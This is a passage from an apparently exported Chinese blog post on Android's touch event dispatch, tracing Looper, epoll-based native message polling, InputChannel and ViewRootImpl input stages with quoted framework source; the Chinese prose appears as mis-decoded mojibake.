çŽ°åœ¨æˆ‘ä»¬å¯ä»¥é‡æ–°çœ‹å¾…nativePollOnce()å‡½æ•°ï¼Œå†æ¬¡å¼ºè°ƒï¼Œå®ƒçš„ä½œç”¨æ˜¯é˜»å¡žï¼Œå½“æœ‰æ–°çš„æ¶ˆæ¯æˆ–è¾¾åˆ°è¶…æ—¶åŽè¿”å›žã€‚è€Œè¿™ä¸ªæ ¸å¿ƒçš„ç‰¹æ€§ï¼Œå®Œå…¨æ˜¯åˆ©ç”¨ç³»ç»Ÿæä¾›çš„epollæœºåˆ¶å®žçŽ°çš„ã€‚ çŽ°åœ¨æ•´ä¸ªJavaæ¶ˆæ¯å¾ªçŽ¯çš„å¤„ç†è¿‡ç¨‹å·²ç»çœ‹å®Œäº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ç»“åˆå¸¸ç”¨çš„Handleræ¥è®²è§£å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­æŠ•å…¥æ–°çš„æ¶ˆæ¯çš„è¿‡ç¨‹ã€‚ Android æ¶ˆæ¯æœºåˆ¶ï¼ˆäºŒï¼‰Handlerå¯¹æ¶ˆæ¯æœºåˆ¶çš„ä½¿ç”¨]]></content>
      <categories>
        <category>Android</category>
        <category>Event</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Event</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android è§¦æ‘¸äº‹ä»¶åˆ†å‘æœºåˆ¶ï¼ˆäºŒï¼‰åŽŸå§‹äº‹ä»¶æ¶ˆæ¯ä¼ é€’ä¸Žåˆ†å‘çš„å¼€å§‹]]></title>
    <url>%2F2017%2F10%2F07%2Fandroid_view_event_2%2F</url>
    <content type="text"><![CDATA[å›žé¡¾åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬æŽ¢ç´¢äº†ä»Žå†…æ ¸è§¦æ‘¸äº‹ä»¶ä¼ é€’åˆ°InputDispatcherçº¿ç¨‹ï¼Œå†ä¸Žåº”ç”¨çº¿ç¨‹ä¹‹é—´å»ºç«‹InputChannelçš„è¿‡ç¨‹ï¼Œå¹¶ä¸”æˆ‘ä»¬å·²ç»çœ‹åˆ°ä¸€ä¸ªæœ€åŽŸå§‹çš„è§¦æ‘¸äº‹ä»¶è¢«å°è£…æˆä¸€ä¸ªmsgå¹¶é€šè¿‡InputChannelå»ºç«‹çš„socketé€šè¿‡sendMessage()æ–¹æ³•è·¨çº¿ç¨‹é€šä¿¡å‘é€ç»™äº†åº”ç”¨çš„UIçº¿ç¨‹ã€‚ è¿™ç¯‡æ–‡ç« å°†ä¼šçœ‹åˆ°åº”ç”¨UIçº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—æ˜¯å¦‚ä½•è¯»å–ä¼ é€’è¿‡æ¥çš„è§¦æ‘¸äº‹ä»¶å¹¶è¿›è¡Œå¤„ç†ã€åˆ†å‘çš„ã€‚ æœ¬ç¯‡æ–‡ç« ä¸»è¦å‚è€ƒäº†Gityuançš„æ–‡ç«  æ¶ˆæ¯å¾ªçŽ¯Androidçš„æ¶ˆæ¯æœºåˆ¶çš„å…·ä½“å†…å®¹åœ¨åªç®€å•æè¿°ï¼Œè¯¦ç»†å†…å®¹è¯·è§ï¼š http://www.viseator.com/2017/10/22/android_event_1/ åº”ç”¨çš„UIçº¿ç¨‹æ‹¥æœ‰æ¶ˆæ¯é˜Ÿåˆ—ä¸Žä¸€ä¸ªLooperï¼Œåº”ç”¨åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨Looperçš„loop()æ–¹æ³•æ¥å¯åŠ¨ä¸€ä¸ªæ— é™å¾ªçŽ¯æ¥ä¸æ–­è¯»å–ã€å¤„ç†é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ï¼ŒAndroidæ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨çš„æ¨¡åž‹ï¼Œåªæœ‰æºæºä¸æ–­çš„äº‹ä»¶äº§ç”Ÿä¸Žå¤„ç†æ‰èƒ½æŽ¨åŠ¨åº”ç”¨çš„è¿›è¡Œã€‚ åŒæ—¶åº”è¯¥æ³¨æ„çš„æ˜¯åœ¨Javaä¸ŽNativeä¸­å„æœ‰ä¸€å¥—æ¶ˆæ¯å¤„ç†çš„æµç¨‹å¯ä»¥è¿›è¡Œæ¶ˆæ¯çš„å¤„ç†ï¼Œè€Œå¦‚åŒè§¦æ‘¸äº‹ä»¶è¿™ç§æ¥æºäºŽNativeå±‚çš„äº‹ä»¶æ¶ˆæ¯ï¼Œéƒ½æ˜¯é€šè¿‡Native Looperè¿›è¡Œå¤„ç†çš„ã€‚ Looperå½“åº”ç”¨åˆå§‹åŒ–æ—¶ï¼Œä¼šè°ƒç”¨Looper.prepare()ï¼š 123456private static void prepare(boolean quitAllowed) &#123; if (sThreadLocal.get() != null) &#123; throw new RuntimeException("Only one Looper may be created per thread"); &#125; sThreadLocal.set(new Looper(quitAllowed));&#125; ä¼šåœ¨ThreadLocalåŒºåŸŸæ–°å»ºä¸€ä¸ªLooperå¯¹è±¡ï¼š 1234private Looper(boolean quitAllowed) &#123; mQueue = new MessageQueue(quitAllowed); mThread = Thread.currentThread();&#125; åŒæ—¶åˆå§‹åŒ–äº†ä¸€ä¸ªMessageQueueï¼Œä¿å­˜äº†å½“å‰çš„çº¿ç¨‹ï¼š 1234MessageQueue(boolean quitAllowed) &#123; mQuitAllowed = quitAllowed; mPtr = nativeInit();&#125; nativeInit()æ–¹æ³•åˆå§‹åŒ–äº†nativeçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼š 12345678910static jlong android_os_MessageQueue_nativeInit(JNIEnv* env, jclass clazz) &#123; NativeMessageQueue* nativeMessageQueue = new NativeMessageQueue(); if (!nativeMessageQueue) &#123; jniThrowRuntimeException(env, "Unable to allocate native queue"); return 0; &#125; nativeMessageQueue-&gt;incStrong(env); return reinterpret_cast&lt;jlong&gt;(nativeMessageQueue);&#125; æ–°å»ºäº†ä¸€ä¸ªNativeMessageQueueï¼š 12345678NativeMessageQueue::NativeMessageQueue() : mPollEnv(NULL), mPollObj(NULL), mExceptionObj(NULL) &#123; mLooper = Looper::getForThread(); if (mLooper == NULL) &#123; mLooper = new Looper(false); Looper::setForThread(mLooper); &#125;&#125; è¿™é‡Œè¿›è¡Œçš„åˆå§‹åŒ–è¿‡ç¨‹ä¸Žjavaå±‚çš„æ¯”è¾ƒç±»ä¼¼ï¼Œéƒ½æ˜¯æ–°å»ºäº†ä¸€ä¸ªLooperå¯¹è±¡å­˜æ”¾å…¥äº†ThreadLocalåŒºåŸŸä¸­ã€‚ å½“åˆå§‹åŒ–è¿‡ç¨‹å®Œæˆä¹‹åŽï¼Œç³»ç»Ÿè°ƒç”¨Looper.loop()å¼€å§‹æ¶ˆæ¯å¾ªçŽ¯ï¼š 12345678910111213141516171819202122232425public static void loop() &#123; final Looper me = myLooper(); ... final MessageQueue queue = me.mQueue; ... for (;;) &#123; Message msg = queue.next(); // might block if (msg == null) &#123; // No message indicates that the message queue is quitting. return; &#125; ... try &#123; msg.target.dispatchMessage(msg); &#125; finally &#123; if (traceTag != 0) &#123; Trace.traceEnd(traceTag); &#125; &#125; ... msg.recycleUnchecked(); &#125;&#125; çœç•¥äº†å¤§é‡ä»£ç ï¼Œæˆ‘ä»¬çœ‹åˆ°åœ¨è¿™ä¸ªæ— é™å¾ªçŽ¯ä¸­ï¼Œé¦–å…ˆå°±è°ƒç”¨äº†MessageQueueçš„next()æ–¹æ³•æ¥èŽ·å–ä¸‹ä¸€æ¡æ¶ˆæ¯ï¼Œæ³¨æ„è¿™æ˜¯ä¸€ä¸ªé˜»å¡žè°ƒç”¨ï¼Œåœ¨ä¸‹ä¸€æ¡æ¶ˆæ¯è¿˜æ²¡åˆ°æ—¶é—´æˆ–è€…æ²¡æœ‰ä¸‹ä¸€æ¡æ¶ˆæ¯æ—¶å€™ä¼šè¢«é˜»å¡žã€‚ 1234567891011121314151617181920Message next() &#123; // Return here if the message loop has already quit and been disposed. // This can happen if the application tries to restart a looper after quit // which is not supported. final long ptr = mPtr; if (ptr == 0) &#123; return null; &#125; int pendingIdleHandlerCount = -1; // -1 only during first iteration int nextPollTimeoutMillis = 0; for (;;) &#123; if (nextPollTimeoutMillis != 0) &#123; Binder.flushPendingCommands(); &#125; nativePollOnce(ptr, nextPollTimeoutMillis); ... &#125;&#125; è¿™é‡Œæˆ‘ä»¬ä¸å…³å¿ƒjavaå±‚åŽç»­å¯¹äº‹ä»¶çš„å¤„ç†ï¼Œè€Œæ˜¯å…³å¿ƒjavaå±‚æ˜¯å¦‚ä½•è°ƒç”¨nativeå±‚çš„æ–¹æ³•æ¥å¯¹nativeæ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„äº‹ä»¶è¿›è¡Œå¤„ç†çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„è§¦æ‘¸äº‹ä»¶æ˜¯åœ¨nativeå±‚è¿›è¡Œå¤„ç†å†åˆ°javaå±‚è¿›è¡Œåˆ†å‘çš„ã€‚ åœ¨next()æ–¹æ³•ä¸­æˆ‘ä»¬å°±è°ƒç”¨äº†nativePollOnce()æ–¹æ³•å…ˆåŽ»å¤„ç†nativeä¸­çš„äº‹ä»¶ï¼š 12345static void android_os_MessageQueue_nativePollOnce(JNIEnv* env, jobject obj, jlong ptr, jint timeoutMillis) &#123; NativeMessageQueue* nativeMessageQueue = reinterpret_cast&lt;NativeMessageQueue*&gt;(ptr); nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);&#125; è°ƒç”¨äº†nativeMessageQueueçš„pollOnce()æ–¹æ³•ï¼š 12345678910111213void NativeMessageQueue::pollOnce(JNIEnv* env, jobject pollObj, int timeoutMillis) &#123; mPollEnv = env; mPollObj = pollObj; mLooper-&gt;pollOnce(timeoutMillis); mPollObj = NULL; mPollEnv = NULL; if (mExceptionObj) &#123; env-&gt;Throw(mExceptionObj); env-&gt;DeleteLocalRef(mExceptionObj); mExceptionObj = NULL; &#125;&#125; è°ƒç”¨äº†native Looperçš„pollOnce()æ–¹æ³•ï¼š 1234567int Looper::pollOnce(int timeoutMillis, int* outFd, int* outEvents, void** outData) &#123; int result = 0; for (;;) &#123; ... result = pollInner(timeoutMillis); &#125;&#125; å¿½ç•¥ç‰¹æ®Šå¤„ç†çš„è¿‡ç¨‹ï¼Œæœ€ç»ˆè°ƒç”¨äº†pollInner()æ–¹æ³•ï¼šï¼ˆPollInner()çš„ä»£ç æ¯”è¾ƒé•¿ï¼Œçœç•¥äº†å¤§éƒ¨åˆ†ï¼Œæ ‡è®°äº†åŽé¢è®¨è®ºçš„ä¸‰ä¸ªéƒ¨åˆ†ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566int Looper::pollInner(int timeoutMillis) &#123; ...// çœç•¥åˆå§‹åŒ–è¿‡ç¨‹ // Poll. int result = POLL_WAKE; mResponses.clear(); mResponseIndex = 0; // We are about to idle. mPolling = true; /*-------1-------*/ struct epoll_event eventItems[EPOLL_MAX_EVENTS]; int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis); ... /*---------------*/ /*-------2-------*/ for (int i = 0; i &lt; eventCount; i++) &#123; int fd = eventItems[i].data.fd; uint32_t epollEvents = eventItems[i].events; if (fd == mWakeEventFd) &#123; if (epollEvents &amp; EPOLLIN) &#123; awoken(); &#125; else &#123; ALOGW("Ignoring unexpected epoll events 0x%x on wake event fd.", epollEvents); &#125; &#125; else &#123; ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &gt;= 0) &#123; int events = 0; if (epollEvents &amp; EPOLLIN) events |= EVENT_INPUT; if (epollEvents &amp; EPOLLOUT) events |= EVENT_OUTPUT; if (epollEvents &amp; EPOLLERR) events |= EVENT_ERROR; if (epollEvents &amp; EPOLLHUP) events |= EVENT_HANGUP; pushResponse(events, mRequests.valueAt(requestIndex)); &#125; else &#123; ALOGW("Ignoring unexpected epoll events 0x%x on fd %d that is " "no longer registered.", epollEvents, fd); &#125; &#125; &#125;Done: ; ...// çœç•¥native messageå¤„ç†è¿‡ç¨‹ // Release lock. mLock.unlock(); /*---------------*/ /*-------3-------*/ for (size_t i = 0; i &lt; mResponses.size(); i++) &#123; Response&amp; response = mResponses.editItemAt(i); if (response.request.ident == POLL_CALLBACK) &#123; int fd = response.request.fd; int events = response.events; void* data = response.request.data; int callbackResult = response.request.callback-&gt;handleEvent(fd, events, data); if (callbackResult == 0) &#123; removeFd(fd, response.request.seq); &#125; response.request.callback.clear(); result = POLL_CALLBACK; &#125; &#125; /*---------------*/ return result;&#125; ç¬¬ä¸€éƒ¨åˆ†ä¸­ï¼Œè°ƒç”¨äº†epoll_wait()å‡½æ•°ç­‰å¾…æ¶ˆæ¯ï¼Œå½“æŽ¥æ”¶åˆ°æ¶ˆæ¯æˆ–è€…å‘ç”Ÿè¶…æ—¶çš„æ—¶å€™è°ƒç”¨è¿”å›žã€‚ ç¬¬äºŒéƒ¨åˆ†å¯¹è¿”å›žçš„eventsè¿›è¡ŒéåŽ†ï¼Œå¦‚æžœå¯¹åº”çš„fdä¸ºå”¤é†’ä¸“ç”¨çš„mWakeEventFdï¼Œæ‰§è¡Œawoken()å‡½æ•°æ¸…ç©ºç®¡é“ï¼Œè¿™ä¸ªäº‹ä»¶çš„ä½œç”¨åªæ˜¯ä¸ºäº†å”¤é†’Looperå¯¹æ–°æ¶ˆæ¯è¿›è¡Œå¤„ç†ã€‚ å¦‚æžœä¸æ˜¯mWakeEventFdï¼Œè¯´æ˜Žä¸ºæˆ‘ä»¬ä¹‹å‰é€šè¿‡addFd()å‡½æ•°æ·»åŠ çš„è‡ªå®šä¹‰fdï¼Œæˆ‘ä»¬éœ€è¦å¯¹è¿™ä¸ªeventè¿›è¡Œå¤„ç†ï¼Œå¤„ç†å‡½æ•°ä¸ºpushResponse()ï¼š 12ssize_t requestIndex = mRequests.indexOfKey(fd);pushResponse(events, mRequests.valueAt(requestIndex)); æˆ‘ä»¬è¿˜è®°å¾—åœ¨å‰é¢addFd()çš„è¿‡ç¨‹ä¸­å·²ç»å°†fdä½œä¸ºç´¢å¼•ï¼Œå‘mRequestä¸­ä¿å­˜äº†requestä¿¡æ¯ï¼Œä¿¡æ¯ä¸­åŒ…å«äº†callbackä¹Ÿå°±æ˜¯NativeInputEventReceiverå¯¹è±¡ã€‚ 123456void Looper::pushResponse(int events, const Request&amp; request) &#123; Response response; response.events = events; response.request = request; mResponses.push(response);&#125; è¿™é‡Œå°†requestå¯¹è±¡åŒ…è£…æˆäº†ä¸€ä¸ªresponseï¼Œç„¶åŽå­˜å…¥äº†mResponsesä¸­ç­‰å¾…åŽé¢çš„å¤„ç†ã€‚ ç¬¬ä¸‰éƒ¨åˆ†ä¸­å°±æ˜¯å¯¹äºŽresponseçš„å¤„ç†è¿‡ç¨‹ï¼Œä¸»è¦å°±æ˜¯è¿™ä¸ªè°ƒç”¨ï¼š 1int callbackResult = response.request.callback-&gt;handleEvent(fd, events, data); è°ƒç”¨äº†callbackçš„handleEvent()ï¼Œæˆ‘ä»¬çŽ°åœ¨çŸ¥é“callbackæ˜¯å‰é¢ä¿å­˜çš„NativeInputEventReceiverå¯¹è±¡ã€‚ çŽ°åœ¨ï¼Œå½“åŽŸå§‹äº‹ä»¶é€šè¿‡å»ºç«‹å¥½çš„InputChannelçš„sendMessage()å‡½æ•°å‘é€è§¦æ‘¸äº‹ä»¶æ—¶ï¼š 123456789status_t InputChannel::sendMessage(const InputMessage* msg) &#123; size_t msgLength = msg-&gt;size(); ssize_t nWrite; do &#123; nWrite = ::send(mFd, msg, msgLength, MSG_DONTWAIT | MSG_NOSIGNAL); &#125; while (nWrite == -1 &amp;&amp; errno == EINTR); ... return OK;&#125; ä¼šç›´æŽ¥è°ƒç”¨send()å‡½æ•°å‘fdè¡¨ç¤ºçš„socketä¸­å†™å…¥æ•°æ®ï¼ŒåŒæ—¶åœ¨å¦ä¸€è¾¹çš„epoll_wait()è°ƒç”¨å°±ä¼šå› socketå¦ä¸€ç«¯fdæ•°æ®çš„åˆ°æ¥è€Œå”¤é†’ï¼Œå¹¶é€šè¿‡fdæ‰¾åˆ°æ³¨å†Œå¥½çš„requestï¼Œè¿›è€Œè°ƒç”¨requestä¸­çš„NativeInputEventReceiverçš„handleEvent()æ–¹æ³•ï¼Œå‚æ•°å°±æ˜¯æˆ‘ä»¬æŽ¥æ”¶åˆ°çš„äº‹ä»¶ä¿¡æ¯ä¸Žæ•°æ®ã€‚ handleEvent1234567891011int NativeInputEventReceiver::handleEvent(int receiveFd, int events, void* data) &#123; ... if (events &amp; ALOOPER_EVENT_INPUT) &#123; JNIEnv* env = AndroidRuntime::getJNIEnv(); status_t status = consumeEvents(env, false /*consumeBatches*/, -1, NULL); mMessageQueue-&gt;raiseAndClearException(env, "handleReceiveCallback"); return status == OK || status == NO_MEMORY ? 1 : 0; &#125; ... return 1;&#125; è°ƒç”¨äº†consumeEvents()å‡½æ•°æ¥å¤„ç†äº‹ä»¶ï¼Œå‡½æ•°è¾ƒé•¿ï¼Œæˆ‘ä»¬æ‹†å¼€æ¥çœ‹ï¼š å‡½æ•°è¿›è¡Œåˆå§‹åŒ–è¿‡ç¨‹ä¹‹åŽæ‰§è¡Œäº†ä¸€ä¸ªæ— é™å¾ªçŽ¯ï¼Œå¾ªçŽ¯ä½“ä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š 123InputEvent* inputEvent; status_t status = mInputConsumer.consume(&amp;mInputEventFactory, consumeBatches, frameTime, &amp;seq, &amp;inputEvent); é¦–å…ˆå°±è°ƒç”¨äº†mInputConsumerå¯¹è±¡çš„consumeæ–¹æ³•æŽ¥æ”¶å¹¶å°†åŽŸå§‹çš„äº‹ä»¶è½¬æ¢ä¸ºåˆ†å‘è¿‡ç¨‹ä¸­æ ‡å‡†çš„MotionEventï¼š 1status_t result = mChannel-&gt;receiveMessage(&amp;mMsg); è¿™é‡Œå°±ç›´æŽ¥è°ƒç”¨äº†InputChannelçš„receiveMessage()å‡½æ•°æ¥æŽ¥æ”¶å¦ä¸€ç«¯å‘é€æ¥çš„æ¶ˆæ¯ã€‚ 1234567status_t InputChannel::receiveMessage(InputMessage* msg) &#123; ssize_t nRead; do &#123; nRead = ::recv(mFd, msg, sizeof(InputMessage), MSG_DONTWAIT); &#125; while (nRead == -1 &amp;&amp; errno == EINTR); ...&#125; ä»Žsocketå¦ä¸€ç«¯çš„fdä¸­è¯»å–å‘é€è¿‡æ¥çš„è§¦æ‘¸äº‹ä»¶æ¶ˆæ¯å¹¶å­˜æ”¾åœ¨äº†mMsgä¸­ï¼Œä¹‹åŽè¿›è¡Œå¤„ç†ï¼š 12345678910111213141516171819202122 switch (mMsg.header.type) &#123; case InputMessage::TYPE_KEY: &#123; ... &#125; case AINPUT_EVENT_TYPE_MOTION: &#123; ... MotionEvent* motionEvent = factory-&gt;createMotionEvent(); if (! motionEvent) return NO_MEMORY; updateTouchState(&amp;mMsg); initializeMotionEvent(motionEvent, &amp;mMsg); *outSeq = mMsg.body.motion.seq; *outEvent = motionEvent;#if DEBUG_TRANSPORT_ACTIONS ALOGD("channel '%s' consumer ~ consumed motion event, seq=%u", mChannel-&gt;getName().string(), *outSeq);#endif break; &#125; &#125; è¿™é‡Œå¯¹äº‹ä»¶çš„ç±»åž‹è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå½“ç±»åž‹ä¸ºMOTIONå³è§¦æ‘¸äº‹ä»¶æ—¶ï¼Œæ–°å»ºäº†ä¸€ä¸ªMotionEventï¼Œç„¶åŽç”¨mMsgåŽ»è¿›è¡Œåˆå§‹åŒ–ï¼š 12345678910111213141516171819202122232425262728void InputConsumer::initializeMotionEvent(MotionEvent* event, const InputMessage* msg) &#123; uint32_t pointerCount = msg-&gt;body.motion.pointerCount; PointerProperties pointerProperties[pointerCount]; PointerCoords pointerCoords[pointerCount]; for (uint32_t i = 0; i &lt; pointerCount; i++) &#123; pointerProperties[i].copyFrom(msg-&gt;body.motion.pointers[i].properties); pointerCoords[i].copyFrom(msg-&gt;body.motion.pointers[i].coords); &#125; event-&gt;initialize( msg-&gt;body.motion.deviceId, msg-&gt;body.motion.source, msg-&gt;body.motion.action, msg-&gt;body.motion.actionButton, msg-&gt;body.motion.flags, msg-&gt;body.motion.edgeFlags, msg-&gt;body.motion.metaState, msg-&gt;body.motion.buttonState, msg-&gt;body.motion.xOffset, msg-&gt;body.motion.yOffset, msg-&gt;body.motion.xPrecision, msg-&gt;body.motion.yPrecision, msg-&gt;body.motion.downTime, msg-&gt;body.motion.eventTime, pointerCount, pointerProperties, pointerCoords);&#125; ç„¶åŽåœ¨ç¬¬14è¡ŒæŠŠå®ƒå­˜å…¥äº†outEventï¼ˆä¹Ÿå°±æ˜¯consume()å‡½æ•°ä¸­ä¼ å…¥çš„inputEventï¼‰ä¸­ï¼ŒçŽ°åœ¨å‡½æ•°è¿”å›žåˆ°NativeInputEventReceiver::consumeEvents()ç»§ç»­å¤„ç†ï¼š 1234567891011121314151617181920212223242526switch (inputEvent-&gt;getType()) &#123; case AINPUT_EVENT_TYPE_KEY: ... case AINPUT_EVENT_TYPE_MOTION: &#123; if (kDebugDispatchCycle) &#123; ALOGD("channel '%s' ~ Received motion event.", getInputChannelName()); &#125; MotionEvent* motionEvent = static_cast&lt;MotionEvent*&gt;(inputEvent); if ((motionEvent-&gt;getAction() &amp; AMOTION_EVENT_ACTION_MOVE) &amp;&amp; outConsumedBatch) &#123; *outConsumedBatch = true; &#125; inputEventObj = android_view_MotionEvent_obtainAsCopy(env, motionEvent); break; &#125; ... &#125; if (inputEventObj) &#123; if (kDebugDispatchCycle) &#123; ALOGD("channel '%s' ~ Dispatching input event.", getInputChannelName()); &#125; env-&gt;CallVoidMethod(receiverObj.get(), gInputEventReceiverClassInfo.dispatchInputEvent, seq, inputEventObj); ... &#125; ä¸‹é¢å°±å¯¹inputEventï¼ˆå³ä¸ºMotionEventï¼‰çš„ç±»åž‹ä½œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¯¹inputEventObjï¼ˆç”¨äºŽè°ƒç”¨javaå±‚æ–¹æ³•ï¼‰è¿›è¡Œèµ‹å€¼ã€‚éšåŽå°±é€šè¿‡JNI çš„CallVoidMethod()æ–¹æ³•æ¥è°ƒç”¨javaå±‚çš„dispatchInputEvent()æ–¹æ³•ã€‚è¿™é‡Œè°ƒç”¨çš„æ˜¯javaå±‚InputEventReceiverçš„dispatchInputEvent()æ–¹æ³•ï¼š ä»Žè¿™é‡Œï¼Œæˆ‘ä»¬ä»ŽNativeå±‚è·¨è¶Šåˆ°äº†javaå±‚ã€‚ å¼€å§‹åˆ†å‘dispatchInputEvent1234private void dispatchInputEvent(int seq, InputEvent event) &#123; mSeqMap.put(event.getSequenceNumber(), seq); onInputEvent(event);&#125; InputEventReceiveræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå…·ä½“å®žçŽ°ç±»æ˜¯ViewRootImplçš„å†…éƒ¨ç±»WindowInputEventReceiverï¼Œå®ƒè¦†ç›–äº†onInputEvent()æ–¹æ³•ï¼š 1234@Overridepublic void onInputEvent(InputEvent event) &#123; enqueueInputEvent(event, this, 0, true);&#125; è°ƒç”¨äº†ViewRootImplçš„enqueueInputEvent()æ–¹æ³•ï¼š 12345678910111213141516171819202122232425262728void enqueueInputEvent(InputEvent event, InputEventReceiver receiver, int flags, boolean processImmediately) &#123; adjustInputEventForCompatibility(event); QueuedInputEvent q = obtainQueuedInputEvent(event, receiver, flags); // Always enqueue the input event in order, regardless of its time stamp. // We do this because the application or the IME may inject key events // in response to touch events and we want to ensure that the injected keys // are processed in the order they were received and we cannot trust that // the time stamp of injected events are monotonic. QueuedInputEvent last = mPendingInputEventTail; if (last == null) &#123; mPendingInputEventHead = q; mPendingInputEventTail = q; &#125; else &#123; last.mNext = q; mPendingInputEventTail = q; &#125; mPendingInputEventCount += 1; Trace.traceCounter(Trace.TRACE_TAG_INPUT, mPendingInputEventQueueLengthCounterName, mPendingInputEventCount); if (processImmediately) &#123; doProcessInputEvents(); &#125; else &#123; scheduleProcessInputEvents(); &#125;&#125; å°†æŽ¥æ”¶åˆ°çš„äº‹ä»¶åŠ å…¥äº†mPendingInutEventé“¾è¡¨çš„å¤´éƒ¨ï¼Œæ³¨é‡Šé‡Œç»™å‡ºäº†è¿™ä¹ˆåšçš„åŽŸå› ï¼šå½“å‘ç”Ÿäº‹ä»¶æ’å…¥çš„æ—¶å€™æˆ‘ä»¬ä¸èƒ½ä¾èµ–äº‹ä»¶çš„æ—¶é—´æˆ³æ˜¯å‡†ç¡®çš„ï¼Œå› æ­¤å¿…é¡»è®©æœ€æ–°æ”¶åˆ°çš„äº‹ä»¶å…ˆè¿›è¡Œå¤„ç†ã€‚ æœ€ç»ˆè°ƒç”¨doProcessInputEvents()è¿›è¡Œäº‹ä»¶å¤„ç†ï¼š 12345678910111213141516171819202122232425262728void doProcessInputEvents() &#123; // Deliver all pending input events in the queue. while (mPendingInputEventHead != null) &#123; QueuedInputEvent q = mPendingInputEventHead; mPendingInputEventHead = q.mNext; if (mPendingInputEventHead == null) &#123; mPendingInputEventTail = null; &#125; q.mNext = null; mPendingInputEventCount -= 1; Trace.traceCounter(Trace.TRACE_TAG_INPUT, mPendingInputEventQueueLengthCounterName, mPendingInputEventCount); long eventTime = q.mEvent.getEventTimeNano(); long oldestEventTime = eventTime; if (q.mEvent instanceof MotionEvent) &#123; MotionEvent me = (MotionEvent)q.mEvent; if (me.getHistorySize() &gt; 0) &#123; oldestEventTime = me.getHistoricalEventTimeNano(0); &#125; &#125; mChoreographer.mFrameInfo.updateInputEventTime(eventTime, oldestEventTime); deliverInputEvent(q); &#125; ...&#125; åœ¨ä»Žé“¾è¡¨ä¸­å–å‡ºäº‹ä»¶ä¹‹åŽï¼Œå¯¹äº‹ä»¶çš„æ—¶é—´æˆ³è¿›è¡Œäº†æ›´æ–°ã€‚ç„¶åŽè°ƒç”¨deliverInputEvent()æ–¹æ³•ï¼š 12345678910111213141516171819private void deliverInputEvent(QueuedInputEvent q) &#123; Trace.asyncTraceBegin(Trace.TRACE_TAG_VIEW, "deliverInputEvent", q.mEvent.getSequenceNumber()); if (mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onInputEvent(q.mEvent, 0); &#125; InputStage stage; if (q.shouldSendToSynthesizer()) &#123; stage = mSyntheticInputStage; &#125; else &#123; stage = q.shouldSkipIme() ? mFirstPostImeInputStage : mFirstInputStage; &#125; if (stage != null) &#123; stage.deliver(q); &#125; else &#123; finishInputEvent(q); &#125;&#125; è¿™æ®µä»£ç ç¬¬ä¸€çœ¼çœ‹ä¸ŠåŽ»æ¯”è¾ƒéš¾æ‡‚ï¼ŒStageè®©æˆ‘ä»¬è”æƒ³åˆ°äº†CPUæµæ°´çº¿å¤„ç†è¿‡ç¨‹ä¸­çš„Stageï¼Œè¿™é‡Œå°±æ˜¯è¿›å…¥äº†ä¸€ä¸ªæµæ°´çº¿è¿‡ç¨‹æ¥å¤„ç†äº‹ä»¶ï¼š æµæ°´çº¿äº‹ä»¶å¤„ç† é¦–å…ˆçœ‹åˆ°æˆ‘ä»¬å¯ä»¥æ ¹æ®äº‹ä»¶ç±»åž‹çš„éœ€è¦ä»ŽmSyntheticInputStage EarlyPostImeInputStage NativePreImeInputStageä¸‰ä¸ªå…¥å£è¿›å…¥æµæ°´çº¿ï¼Œè€Œæµæ°´çº¿çš„æ¯ä¸€æ­¥éƒ½å¯¹äº‹ä»¶è¿›è¡Œäº†ä¸åŒçš„å¤„ç†ï¼Œå¹¶å¯ä»¥é€šè¿‡forward()æ–¹æ³•ä¼ é€’åˆ°ä¸‹ä¸€ä¸ªStageè¿›è¡Œå¤„ç†ã€‚å¹¶ä¸”è¿™é‡Œä½¿ç”¨çš„æµæ°´çº¿æ˜¯ä¸€ä¸ªå¼‚æ­¥æµæ°´çº¿ï¼Œå¯ä»¥å…è®¸å¤šä¸ªäº‹ä»¶åŒæ—¶åœ¨é‡Œé¢è¿è¡Œå¤„ç†ï¼Œè¿™ç§æž¶æž„ä½¿å¾—äº‹ä»¶å¤„ç†æµç¨‹æ•ˆçŽ‡éžå¸¸é«˜ã€‚ é‚£ä¹ˆæˆ‘ä»¬çš„è§¦æ‘¸äº‹ä»¶ä»ŽNativePreImeInputStageè¿›å…¥æµæ°´çº¿åŽä¼šç»åŽ†ä»€ä¹ˆå¤„ç†è¿‡ç¨‹å‘¢ï¼š æˆ‘ä»¬å¹¶ä¸æ˜¯IMEçš„äº‹ä»¶ï¼Œæ‰€ä»¥ç›´æŽ¥ä»ŽEarlyPostImeInputStageå¼€å§‹ï¼š EarlyPostImeInputStage123456789101112@Overrideprotected int onProcess(QueuedInputEvent q) &#123; if (q.mEvent instanceof KeyEvent) &#123; return processKeyEvent(q); &#125; else &#123; final int source = q.mEvent.getSource(); if ((source &amp; InputDevice.SOURCE_CLASS_POINTER) != 0) &#123; return processPointerEvent(q); &#125; &#125; return FORWARD;&#125; ç¬¬7è¡Œåˆ¤æ–­æˆç«‹ï¼Œè¿›å…¥processPointerEvent()ï¼š 123456789101112131415161718192021222324252627private int processPointerEvent(QueuedInputEvent q) &#123; final MotionEvent event = (MotionEvent)q.mEvent; // Translate the pointer event for compatibility, if needed. if (mTranslator != null) &#123; mTranslator.translateEventInScreenToAppWindow(event); &#125; // Enter touch mode on down or scroll. final int action = event.getAction(); if (action == MotionEvent.ACTION_DOWN || action == MotionEvent.ACTION_SCROLL) 